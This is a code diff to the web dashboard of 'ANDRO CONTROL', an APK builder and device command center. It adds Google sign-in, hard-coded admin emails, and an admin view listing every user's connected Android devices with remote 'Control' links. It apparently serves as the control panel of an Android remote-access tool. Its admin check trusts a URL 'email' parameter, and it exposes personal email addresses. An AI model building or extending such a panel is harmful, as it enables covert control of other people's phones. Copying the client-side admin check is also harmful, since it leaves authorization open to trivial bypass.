@@ -18,10 +18,11 @@
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('uid') || 'master01';
+        let userId = urlParams.get('uid') || 'master01';
         const FIREBASE_URL = urlParams.get('firebase_url') || "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/";
         
         // Extract project ID from database URL for proper initialization
@@ -33,9 +34,25 @@
             });
         }
         const fbDb = firebase.database();
+        const fbAuth = firebase.auth();
     </script>
 </head>
 <body>
+    <!-- Auth Overlay (Shown when not logged in) -->
+    <div id="authOverlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 15, 26, 0.96); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+        <div class="card" style="max-width: 400px; width: 90%; padding: 40px 28px; text-align: center; border: 1px solid rgba(108, 92, 231, 0.3); box-shadow: 0 20px 50px rgba(0,0,0,0.6); background: rgba(22, 22, 38, 0.95);">
+            <div style="width: 64px; height: 64px; margin: 0 auto 20px; background: rgba(108, 92, 231, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(108, 92, 231, 0.3);">
+                <i class="fas fa-satellite-dish" style="font-size: 1.8rem; color: var(--accent, #6c5ce7);"></i>
+            </div>
+            <h2 style="font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; font-family: 'Outfit', sans-serif; letter-spacing: 0.5px;">ANDRO CONTROL</h2>
+            <p style="color: var(--text-secondary, #a0a0b0); font-size: 0.85rem; margin-bottom: 28px; line-height: 1.5;">Please sign in with Google to access the command center and APK builder.</p>
+            <button id="googleSignInBtn" onclick="handleGoogleSignIn()" class="btn-primary-glow" style="width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px 20px; font-size: 0.9rem; font-weight: 600; cursor: pointer; border-radius: 8px;">
+                <i class="fab fa-google" style="font-size: 1.1rem;"></i> Sign in with Google
+            </button>
+            <p id="authError" style="color: #ff6b6b; font-size: 0.78rem; margin-top: 16px; display: none; background: rgba(255,107,107,0.1); padding: 8px 12px; border-radius: 6px; border: 1px solid rgba(255,107,107,0.2);"></p>
+        </div>
+    </div>
+
     <!-- Navbar -->
     <nav class="navbar">
         <div style="max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between;">
@@ -43,9 +60,21 @@
                 <span class="brand-icon"><i class="fas fa-satellite-dish"></i></span>
                 ANDRO CONTROL
             </a>
-            <div style="display: flex; align-items: center; gap: 8px;">
+            <div style="display: flex; align-items: center; gap: 12px;">
                 <a href="index.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
                 <span class="live-badge"><span class="live-dot"></span> SYSTEM ACTIVE</span>
+                
+                <!-- Google User Profile Section -->
+                <div id="navUserProfile" style="display: none; align-items: center; gap: 10px; margin-left: 8px; padding-left: 14px; border-left: 1px solid rgba(255,255,255,0.12);">
+                    <img id="userAvatar" src="" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover; border: 2px solid var(--accent, #6c5ce7);">
+                    <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                        <span id="userName" style="font-size: 0.82rem; font-weight: 600; color: #fff; line-height: 1.2;">User Name</span>
+                        <span id="userRoleBadge" style="font-size: 0.6rem; font-weight: 700; padding: 1px 6px; border-radius: 4px; display: inline-block; text-transform: uppercase;">USER</span>
+                    </div>
+                    <button id="signOutBtn" onclick="handleSignOut()" class="btn-ghost" style="padding: 4px 10px; font-size: 0.75rem; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); border-radius: 6px; cursor: pointer; background: transparent; transition: all 0.2s;">
+                        <i class="fas fa-sign-out-alt" style="margin-right: 4px;"></i> Sign Out
+                    </button>
+                </div>
             </div>
         </div>
     </nav>
@@ -165,26 +194,116 @@
     </main>
 
     <script>
-    // Update UID in UI header
-    document.getElementById('uidDisplay').textContent = userId;
+    // Define Admin emails list
+    const ADMIN_EMAILS = ['ggvgghb243@gmail.com', 'ohedulislam577@gmail.com'];
+
+    // Store current logged-in user profile in JS
+    let currentUserProfile = null;
 
     let deviceCache = {};
     let healthListeners = {};
     let githubToken = '';
 
-    // Load GitHub token from Firebase (not hardcoded to prevent secret scanning revocation)
+    // Update UI header UID initial placeholder
+    document.getElementById('uidDisplay').textContent = userId;
+
+    // Load GitHub token from Firebase
     fbDb.ref('config/github_token').once('value', snap => {
         githubToken = snap.val() || '';
     });
 
-    // Initial check for existing build status & last_apk from Firebase
-    fbDb.ref('panel_users/' + userId).once('value', snap => {
-        const udata = snap.val();
-        if (udata && udata.last_apk) {
-            document.getElementById('downloadBtn').setAttribute('data-apk', udata.last_apk);
-            document.getElementById('downloadArea').style.display = 'block';
+    // Google Sign-In Handler
+    function handleGoogleSignIn() {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        fbAuth.signInWithPopup(provider).catch(err => {
+            console.error("Google Sign-in Error:", err);
+            const errEl = document.getElementById('authError');
+            if (errEl) {
+                errEl.textContent = 'Sign-in failed: ' + err.message;
+                errEl.style.display = 'block';
+            }
+        });
+    }
+
+    // Sign Out Handler
+    function handleSignOut() {
+        fbAuth.signOut().then(() => {
+            console.log('User signed out successfully');
+        }).catch(err => {
+            console.error('Sign-out Error:', err);
+        });
+    }
+
+    // Firebase Auth State Listener
+    fbAuth.onAuthStateChanged(user => {
+        if (user) {
+            // Calculate user's UID (sanitize user's email or fallback to user.uid)
+            const email = user.email || '';
+            userId = email ? email.replace(/[@.]/g, '_') : user.uid;
+            
+            // Check if user is Admin
+            const isAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+
+            // Store current logged in user profile in JS
+            currentUserProfile = {
+                uid: userId,
+                firebaseUid: user.uid,
+                name: user.displayName || (email ? email.split('@')[0] : 'User'),
+                email: email,
+                photoURL: user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y',
+                role: isAdmin ? 'ADMIN' : 'USER'
+            };
+
+            // Display user name, avatar, role badge, and UID display
+            document.getElementById('uidDisplay').textContent = userId;
+            document.getElementById('userName').textContent = currentUserProfile.name;
+            document.getElementById('userAvatar').src = currentUserProfile.photoURL;
+
+            const roleBadge = document.getElementById('userRoleBadge');
+            roleBadge.textContent = currentUserProfile.role;
+            if (isAdmin) {
+                roleBadge.style.background = 'rgba(235, 77, 75, 0.2)';
+                roleBadge.style.color = '#eb4d4b';
+                roleBadge.style.border = '1px solid rgba(235, 77, 75, 0.4)';
+            } else {
+                roleBadge.style.background = 'rgba(0, 184, 148, 0.2)';
+                roleBadge.style.color = '#00b894';
+                roleBadge.style.border = '1px solid rgba(0, 184, 148, 0.4)';
+            }
+
+            // Hide auth overlay and show navbar profile
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('navUserProfile').style.display = 'flex';
+
+            // Initialize user session data & listeners
+            initUserSession();
+        } else {
+            // User is signed out
+            currentUserProfile = null;
+            document.getElementById('authOverlay').style.display = 'flex';
+            document.getElementById('navUserProfile').style.display = 'none';
+
+            // Clear devices cache and health listeners
+            deviceCache = {};
+            healthListeners = {};
+            renderDeviceList();
         }
     });
+
+    function initUserSession() {
+        // Initial check for existing build status & last_apk from Firebase for logged-in user
+        fbDb.ref('panel_users/' + userId).once('value', snap => {
+            const udata = snap.val();
+            if (udata && udata.last_apk) {
+                document.getElementById('downloadBtn').setAttribute('data-apk', udata.last_apk);
+                document.getElementById('downloadArea').style.display = 'block';
+            }
+        });
+
+        // Start listening to realtime health and build status
+        setupRealtimeHealthListeners();
+        listenToBuildStatus();
+    }
 
     // Direct APK download from GitHub Actions Artifacts (not releases)
     async function downloadApk(el) {
@@ -381,6 +500,18 @@
         });
     }
 
+    function checkIsAdmin() {
+        const adminEmailsLower = ADMIN_EMAILS.map(e => e.toLowerCase());
+        if (currentUserProfile && currentUserProfile.email) {
+            if (adminEmailsLower.includes(currentUserProfile.email.toLowerCase())) return true;
+        }
+        if (currentUserProfile && currentUserProfile.role === 'ADMIN') return true;
+        if (userId && adminEmailsLower.includes(userId.toLowerCase())) return true;
+        const emailParam = (urlParams.get('email') || urlParams.get('user_email') || '').toLowerCase();
+        if (emailParam && adminEmailsLower.includes(emailParam)) return true;
+        return false;
+    }
+
     function renderDeviceList() {
         const body = document.getElementById('deviceList');
         const skeleton = document.getElementById('deviceSkeleton');
@@ -390,11 +521,23 @@
         listArea.style.display = 'block';
         
         let devices = Object.values(deviceCache);
+        const isAdmin = checkIsAdmin();
+        
+        // Dynamically adjust table header based on Admin vs Normal user mode
+        const tableHead = document.querySelector('.data-table thead tr');
+        if (tableHead) {
+            if (isAdmin) {
+                tableHead.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+            } else {
+                tableHead.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+            }
+        }
         
         if (!devices.length) {
             document.getElementById('deviceCount').textContent = 0;
             document.getElementById('onlineCount').textContent = '0 online';
-            body.innerHTML = '<tr><td colspan="4"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>';
+            const colspan = isAdmin ? 5 : 4;
+            body.innerHTML = `<tr><td colspan="${colspan}"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>`;
             return;
         }
         
@@ -418,66 +561,147 @@
             const sl = d.is_online ? 'Online' : 'Offline';
             const rowClass = d.is_online ? 'device-row-online' : 'device-row-offline';
             const bi = d.battery < 20 ? 'fa-battery-empty text-danger-c' : d.battery < 50 ? 'fa-battery-quarter text-warning-c' : 'fa-battery-full text-success-c';
-            h += `<tr class="${rowClass}"><td><div style="font-weight:600;font-size:0.85rem;">${d.model}</div><div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div></td><td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td><td><span class="${st}">${sl}</span></td><td style="text-align:right;"><a href="control.html?uid=${userId}&did=${d.did}" class="btn-accent" style="text-decoration:none;padding:7px 18px;font-size:0.75rem;"><i class="fas fa-terminal" style="margin-right:4px;"></i>Control</a></td></tr>`;
+            const ownerUid = d.ownerUid || userId;
+            const ownerEmail = d.ownerEmail || ownerUid;
+            
+            const controlUrl = `control.html?uid=${encodeURIComponent(ownerUid)}&did=${encodeURIComponent(d.did)}`;
+            
+            let ownerCell = '';
+            if (isAdmin) {
+                const ownerDisplay = (ownerEmail && ownerEmail !== ownerUid)
+                    ? `${ownerEmail} <span style="font-size:0.65rem;color:var(--text-muted);font-weight:normal;">(${ownerUid})</span>`
+                    : ownerUid;
+                ownerCell = `<td><span class="user-badge" style="background:rgba(108,92,231,0.15);color:#a29bfe;border:1px solid rgba(108,92,231,0.3);padding:3px 10px;border-radius:6px;font-size:0.72rem;font-weight:600;display:inline-flex;align-items:center;gap:5px;"><i class="fas fa-user-shield" style="font-size:0.65rem;"></i>${ownerDisplay}</span></td>`;
+            }
+
+            h += `<tr class="${rowClass}">
+                <td>
+                    <div style="font-weight:600;font-size:0.85rem;">${d.model}</div>
+                    <div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div>
+                </td>
+                ${ownerCell}
+                <td><i class="fas ${bi}" style="margin-right:4px;"></i>${d.battery}%</td>
+                <td><span class="${st}">${sl}</span></td>
+                <td style="text-align:right;">
+                    <a href="${controlUrl}" class="btn-accent" style="text-decoration:none;padding:7px 18px;font-size:0.75rem;">
+                        <i class="fas fa-terminal" style="margin-right:4px;"></i>Control
+                    </a>
+                </td>
+            </tr>`;
         });
         body.innerHTML = h;
     }
 
-    // Direct Firebase health listeners for serverless setup
+    // Realtime health listeners for serverless setup with Admin vs Normal User Isolation
     function setupRealtimeHealthListeners() {
-        fbDb.ref('users/' + userId + '/devices').on('child_added', snap => {
-            const did = snap.key;
-            if (healthListeners[did]) return;
+        // Clear previous listeners and cache
+        fbDb.ref('users').off();
+        if (userId) {
+            fbDb.ref('users/' + userId + '/devices').off();
+        }
+        deviceCache = {};
+        healthListeners = {};
+
+        const isAdmin = checkIsAdmin();
+
+        const listenToUserDevices = (targetUid, ownerEmail = '') => {
+            const devicesRef = fbDb.ref('users/' + targetUid + '/devices');
             
-            healthListeners[did] = true;
-            
-            fbDb.ref('users/' + userId + '/devices/' + did + '/health').on('value', hSnap => {
-                const health = hSnap.val() || {};
-                const now = Date.now();
-                
-                let is_online = health.online === true || health.online === 'true' || health.online === 1;
-                if (is_online && health.lastSeen) {
-                    if ((now - health.lastSeen) > 90000) is_online = false;
+            devicesRef.once('value', snap => {
+                if (!snap.exists() || !snap.hasChildren()) {
+                    renderDeviceList();
                 }
+            });
+
+            devicesRef.on('child_added', snap => {
+                const did = snap.key;
+                const cacheKey = targetUid + '_' + did;
+                if (healthListeners[cacheKey]) return;
                 
-                if (!deviceCache[did]) {
-                    deviceCache[did] = { did: did, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
-                }
-                deviceCache[did].battery = health.battery || 0;
-                deviceCache[did].is_online = is_online;
-                deviceCache[did].lastSeen = health.lastSeen || 0;
-                renderDeviceList();
+                healthListeners[cacheKey] = true;
+                
+                const healthRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/health');
+                const infoRef = fbDb.ref('users/' + targetUid + '/devices/' + did + '/info');
+                
+                healthRef.on('value', hSnap => {
+                    const health = hSnap.val() || {};
+                    const now = Date.now();
+                    
+                    let is_online = health.online === true || health.online === 'true' || health.online === 1;
+                    if (is_online && health.lastSeen) {
+                        if ((now - health.lastSeen) > 90000) is_online = false;
+                    }
+                    
+                    if (!deviceCache[cacheKey]) {
+                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
+                    }
+                    deviceCache[cacheKey].battery = health.battery || 0;
+                    deviceCache[cacheKey].is_online = is_online;
+                    deviceCache[cacheKey].lastSeen = health.lastSeen || 0;
+                    renderDeviceList();
+                });
+                
+                infoRef.on('value', iSnap => {
+                    const info = iSnap.val() || {};
+                    if (!deviceCache[cacheKey]) {
+                        deviceCache[cacheKey] = { cacheKey: cacheKey, did: did, ownerUid: targetUid, ownerEmail: ownerEmail || targetUid, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
+                    }
+                    deviceCache[cacheKey].model = info.model || info.brand || 'Unknown';
+                    if (info.email) deviceCache[cacheKey].ownerEmail = info.email;
+                    renderDeviceList();
+                });
             });
             
-            fbDb.ref('users/' + userId + '/devices/' + did + '/info').on('value', iSnap => {
-                const info = iSnap.val() || {};
-                if (!deviceCache[did]) {
-                    deviceCache[did] = { did: did, model: 'Unknown', battery: 0, is_online: false, lastSeen: 0 };
-                }
-                deviceCache[did].model = info.model || info.brand || 'Unknown';
+            devicesRef.on('child_removed', snap => {
+                const did = snap.key;
+                const cacheKey = targetUid + '_' + did;
+                delete deviceCache[cacheKey];
+                delete healthListeners[cacheKey];
+                fbDb.ref('users/' + targetUid + '/devices/' + did + '/health').off();
+                fbDb.ref('users/' + targetUid + '/devices/' + did + '/info').off();
                 renderDeviceList();
             });
-        });
-        
-        fbDb.ref('users/' + userId + '/devices').on('child_removed', snap => {
-            const did = snap.key;
-            delete deviceCache[did];
-            delete healthListeners[did];
-            renderDeviceList();
-        });
+        };
+
+        if (isAdmin) {
+            // ADMIN: Listen to ALL users' devices across the root 'users' node
+            const usersRef = fbDb.ref('users');
+            
+            usersRef.once('value', snap => {
+                if (!snap.exists() || !snap.hasChildren()) {
+                    renderDeviceList();
+                }
+            });
+
+            usersRef.on('child_added', uSnap => {
+                const targetUid = uSnap.key;
+                const uData = uSnap.val() || {};
+                const uEmail = uData.email || uData.user_email || targetUid;
+                listenToUserDevices(targetUid, uEmail);
+            });
+
+            usersRef.on('child_removed', uSnap => {
+                const targetUid = uSnap.key;
+                Object.keys(deviceCache).forEach(cacheKey => {
+                    if (deviceCache[cacheKey].ownerUid === targetUid) {
+                        delete deviceCache[cacheKey];
+                        delete healthListeners[cacheKey];
+                    }
+                });
+                fbDb.ref('users/' + targetUid + '/devices').off();
+                renderDeviceList();
+            });
+        } else {
+            // NORMAL USER: ONLY listen to personal devices
+            listenToUserDevices(userId, currentUserProfile ? currentUserProfile.email : userId);
+        }
     }
 
     function refreshDevices() {
         document.getElementById('deviceSkeleton').style.display = 'block';
         document.getElementById('deviceListArea').style.display = 'none';
-        deviceCache = {};
-        renderDeviceList();
+        setupRealtimeHealthListeners();
     }
-
-    // Start listening immediately
-    setupRealtimeHealthListeners();
-    // Also listen to build status on initial load in case a build is ongoing
-    listenToBuildStatus();
     </script>
 </body>
 </html>
